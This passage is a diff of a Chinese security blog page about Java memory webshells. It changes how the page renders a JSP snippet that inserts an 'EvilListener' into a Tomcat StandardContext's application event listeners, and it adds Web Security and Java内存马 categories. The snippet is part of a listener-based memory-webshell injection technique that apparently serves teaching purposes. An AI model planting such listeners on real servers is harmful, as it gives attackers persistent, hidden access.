-    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> arrayList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span>applicationEventListeners<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    arrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">EvilListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    standardContext<span class="token punctuation">.</span><span class="token function">setApplicationEventListeners</span><span class="token punctuation">(</span>arrayList<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">%</span><span class="token operator">></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());
+    List&lt;Object&gt; arrayList = new ArrayList(applicationEventListeners);
+    arrayList.add(0,new EvilListener());
+    standardContext.setApplicationEventListeners(arrayList.toArray());
+%&gt;
+</code></pre>
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31772441/article/details/80095037">调用list.add方法报错（java.lang.UnsupportedOperationException）</a></p>
 
       </div>
@@ -369,6 +389,23 @@ standardContext<span class="token punctuation">.</span><span class="token functi
               2022-06-09 09:43:07
             </span>
             
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/" title="Web Security">
+                        <b>#</b> Web Security
+                      </a>
+                    </span>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马">
+                        <b>#</b> Java内存马
+                      </a>
+                    </span>
+                    
+                  </span>
+              
                   <span class="post-tags">
                     <i class="iconfont icon-tags mr-10" title="Tags"></i>
                     
